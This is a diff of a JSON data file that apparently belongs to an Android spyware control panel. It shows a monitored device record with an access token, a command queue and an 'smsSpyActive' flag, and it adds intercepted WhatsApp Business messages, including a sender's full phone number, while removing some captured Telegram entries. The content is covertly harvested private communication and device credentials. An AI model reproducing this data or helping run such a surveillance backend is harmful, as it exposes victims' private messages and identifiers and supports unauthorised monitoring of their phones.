@@ -303,7 +303,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775641858677,
+    "lastSeen": 1775641884414,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -319,6 +319,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "+62 853-9386-2021",
+        "content": "belum ada uang aku",
+        "time": "08/04 16:51",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775641886910
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 853-9386-2021",
+        "content": "belum ada uang aku",
+        "time": "08/04 16:51",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775641886824
+      },
       {
         "appName": "Telegram",
         "sender": "STORE Reski",
@@ -4302,22 +4318,6 @@
         "time": "08/04 15:21",
         "pkg": "org.telegram.messenger.web",
         "receivedAt": 1775636503189
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗥𝗢𝗖𝗞𝗬 𝗧𝗘𝗔𝗠 🚩",
-        "content": "Voice message",
-        "time": "08/04 15:21",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775636495962
-      },
-      {
-        "appName": "Telegram",
-        "sender": "TEAM ZANXRES: You",
-        "content": "T̴̕ ̐͒ T̴̕ ̐͒ joined to the group TEAM ZANXRES via invite link",
-        "time": "08/04 15:21",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775636495956
       }
     ],
     "galleryPhotos": [],
